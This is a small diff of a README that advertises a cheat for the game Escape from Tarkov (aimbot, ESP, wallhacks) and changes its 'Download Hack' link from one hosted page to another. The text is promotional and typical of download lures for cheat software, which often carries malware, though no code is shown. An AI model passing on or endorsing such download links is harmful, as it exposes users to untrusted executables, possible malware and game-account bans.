@@ -2,7 +2,7 @@
 
 **Sick of being ambushed? Losing millions in gear raids? With a full-featured EFT hack, you flip the entire game: from tactical hardcore sim to a clean, calculated loot farm. Aimbots, ESP, radar, wallhacks — it's not survival anymore, it’s domination.**
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://EFT-Hack-byga.github.io/.github)
 ---
 
 ## 🎮 What Is an EFT Hack?
